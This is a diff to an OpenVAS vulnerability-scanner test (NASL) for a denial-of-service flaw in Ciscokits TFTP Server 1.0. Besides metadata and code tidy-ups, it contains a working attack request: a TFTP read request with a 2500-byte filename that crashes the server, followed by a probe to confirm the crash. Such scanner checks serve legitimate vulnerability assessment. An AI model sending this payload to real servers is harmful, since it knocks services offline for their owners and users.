@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_ciscokits_tftp_server_dos_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
+# $Id: secpod_ciscokits_tftp_server_dos_vuln.nasl 13202 2019-01-21 15:19:15Z cfischer $
 #
 # Ciscokits TFTP Server Long Filename Denial Of Service Vulnerability
 #
@@ -27,8 +27,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902460");
-  script_version("$Revision: 11997 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
+  script_version("$Revision: 13202 $");
+  script_tag(name:"last_modification", value:"$Date: 2019-01-21 16:19:15 +0100 (Mon, 21 Jan 2019) $");
   script_tag(name:"creation_date", value:"2011-07-27 14:47:11 +0200 (Wed, 27 Jul 2011)");
   script_tag(name:"cvss_base", value:"6.4");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:P");
@@ -40,58 +40,58 @@ if(description)
   script_category(ACT_DENIAL);
   script_copyright("Copyright (C) 2011 SecPod");
   script_family("Denial of Service");
-  script_dependencies("tftpd_detect.nasl");
+  script_dependencies("tftpd_detect.nasl", "os_detection.nasl");
   script_require_udp_ports("Services/udp/tftp", 69);
+  script_require_keys("tftp/detected", "Host/runs_windows");
 
   script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause denial
   of service attacks.");
-  script_tag(name:"affected", value:"Ciscokits TFTP Server version 1.0");
+
+  script_tag(name:"affected", value:"Ciscokits TFTP Server version 1.0.");
+
   script_tag(name:"insight", value:"The flaw is due to an error when handling a long file name
-  read request, which can be exploited by remote unauthenticated attackers
-  to crash an affected application.");
+  read request, which can be exploited by remote unauthenticated attackers to crash an affected application.");
+
   script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
   of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
   release, disable respective features, remove the product or replace the product by another one.");
+
   script_tag(name:"summary", value:"This host is running Ciscokits TFTP Server and is prone to
   denial of service vulnerability.");
 
   script_tag(name:"solution_type", value:"WillNotFix");
-
   script_tag(name:"qod_type", value:"remote_vul");
 
   exit(0);
 }
 
-
 port = get_kb_item("Services/udp/tftp");
-if(!port){
+if(!port)
   port = 69;
-}
+
+if(!get_udp_port_state(port))
+  exit(0);
 
 soc = open_sock_udp(port);
-if(!soc){
+if(!soc)
   exit(0);
-}
 
 request = raw_string(0x00, 0x01, 0x6d, 0x79, 0x74, 0x65, 0x73, 0x74,
                      0x2e, 0x74, 0x78, 0x74, 0x00, 0x6e, 0x65, 0x74,
                      0x61, 0x73, 0x63, 0x69, 0x69, 0x00);
 
-## as Not Found in local Storage
 send(socket:soc, data:request);
 result = recv(socket:soc, length:100);
-if(isnull(result) && "Not Found in local Storage" >!< result){
+if(isnull(result) && "Not Found in local Storage" >!< result) {
+  close(soc);
   exit(0);
 }
 
-##  Construct the attack request with long file name
 attack = raw_string(0x00, 0x01) + crap(data:raw_string(0x41), length: 2500) +
          raw_string(0x00, 0x6e,0x65, 0x74, 0x61, 0x73, 0x63, 0x69, 0x69, 0x00);
 
-## Send the constructed attack request to the socket
 send(socket:soc, data:attack);
 
-## Again send the request for the non existing file to confirm exploit
 request = raw_string(0x00, 0x01, 0x6d, 0x79, 0x74, 0x65, 0x73, 0x74,
                      0x2e, 0x74, 0x78, 0x74, 0x00, 0x6e, 0x65, 0x74,
                      0x61, 0x73, 0x63, 0x69, 0x69, 0x00);
@@ -101,7 +101,7 @@ close(soc);
 
 result = recv(socket:soc, length:100);
 if(isnull(result) && "Not Found in local Storage" >!< result){
-  security_message(port: port, proto: "udp");
+  security_message(port:port, proto:"udp");
   exit(0);
 }
 
